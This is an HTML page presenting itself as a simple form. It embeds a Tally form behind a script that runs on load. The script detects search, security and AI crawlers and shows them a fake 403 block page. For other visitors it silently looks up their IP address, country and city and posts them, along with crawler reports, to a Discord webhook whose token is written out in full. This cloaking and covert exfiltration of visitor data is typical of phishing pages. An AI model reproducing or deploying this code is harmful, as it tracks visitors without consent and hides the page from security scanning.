<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f4f4f4; text-align: center; }
        iframe { width: 100%; height: 100vh; border: none; display: none; }
        #blockMessage { display: none; font-size: 20px; font-weight: bold; color: red; padding: 50px; }
        #footer { position: fixed; bottom: 5px; width: 100%; font-size: 10px; color: gray; }
    </style>
</head>
<body>

    <iframe id="tallyForm"></iframe>

    <div id="blockMessage">
        <h1>Crawler Detected</h1>
        <p>Please contact support: contact@candykingsid.com</p>
        <p>Error Code: 403</p>
    </div>

    <div id="footer">CYBRUIS Security Bot Solutions By Chris Banks</div>

    <script>
        async function getUserData() {
            const webhookURL = "https://discord.com/api/webhooks/1344385758026535054/cSWbFy-5tKPCBRW4IWKhMHDZKkWVQEbFlpkwVgs9LKsJESweTQ-cBrXOviJxVODG_3ps";

            function isBot() {
                const botUserAgents = [
                    "bot", "crawl", "spider", "Googlebot", "Bingbot", "Slurp", "DuckDuckBot",
                    "Baiduspider", "YandexBot", "facebot", "ia_archiver", "MJ12bot",
                    "AhrefsBot", "SemrushBot", "Twitterbot", "LinkedInBot",
                    "Discordbot", "GPTBot", "ClaudeBot", "Bytespider", "NaverBot"
                ];
                return botUserAgents.some(bot => navigator.userAgent.toLowerCase().includes(bot.toLowerCase()));
            }

            if (isBot()) {
                document.getElementById("tallyForm").remove(); // Remove the form completely
                document.getElementById("blockMessage").style.display = "block"; // Show block message
                
                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "Bot Detector",
                        content: `ðŸš¨ **Crawler Detected!**\n\nðŸ†” **User-Agent:** ${navigator.userAgent}\nðŸ“… **Time:** ${new Date().toLocaleString()}`
                    })
                }).catch(error => console.error("Webhook error:", error));

                return;
            }

            // Fetch User IP Information
            let ipData = { ip: "Unknown", country: "Unknown", city: "Unknown", region: "Unknown" };
            try {
                const response = await fetch("https://ipapi.co/json/");
                ipData = await response.json();
            } catch (error) {
                console.error("Failed to get IP info", error);
            }

            // Send tracking data to Discord Webhook
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "User Tracker",
                    content: `âœ… **New User Accessing Form**\n\nðŸ†” **IP:** ${ipData.ip}\nðŸŒŽ **Country:** ${ipData.country_name}\nðŸ™ **City:** ${ipData.city}\nðŸ“… **Time:** ${new Date().toLocaleString()}`
                })
            }).catch(error => console.error("Webhook error:", error));

            // Load the Form
            document.getElementById("tallyForm").src = `https://tally.so/r/wb6M7g`;
            document.getElementById("tallyForm").style.display = "block";
        }

        getUserData();
    </script>

</body>
</html>
